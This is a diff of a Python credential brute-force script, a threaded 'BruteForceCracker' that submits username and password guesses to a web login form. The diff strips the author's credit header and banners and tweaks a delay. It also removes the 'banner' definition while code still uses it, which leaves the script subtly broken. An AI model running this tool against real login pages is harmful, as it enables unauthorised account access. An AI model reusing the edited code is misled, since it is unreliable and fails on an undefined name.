@@ -1,25 +1,3 @@
-######################################################################################################
-# Title: Brute force                                                                                 #
-# Author: Tanvir Hossain Antu                                                                        #
-# Github : https://github.com/Antu7      
-# If you use the code give me the credit please #
-######################################################################################################
-
-print (""" 
-
-██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
-██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
-██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
-██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
-██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            
-                                                                            
-                   Tanvir Hossain Antu
-        https://github.com/Antu7/python-bruteForce
-
-
-""")
-
-
 import threading
 import requests
 import time
@@ -31,10 +9,11 @@ class BruteForceCracker:
         self.username = username
         self.error_message = error_message
         
+        start_msg = "starting the check....!"
         for run in banner:
             sys.stdout.write(run)
             sys.stdout.flush()
-            time.sleep(0.02)
+            time.sleep(0.04)
 
     def crack(self, password):
         data_dict = {"LogInID": self.username, "Password": password, "Log In": "submit"}
@@ -74,9 +53,5 @@ def main():
             t.start()
 
 if __name__ == '__main__':
-    banner = """ 
-                       Checking the Server !!        
-        [+]█████████████████████████████████████████████████[+]
-"""
-    print(banner)
+     
     main()
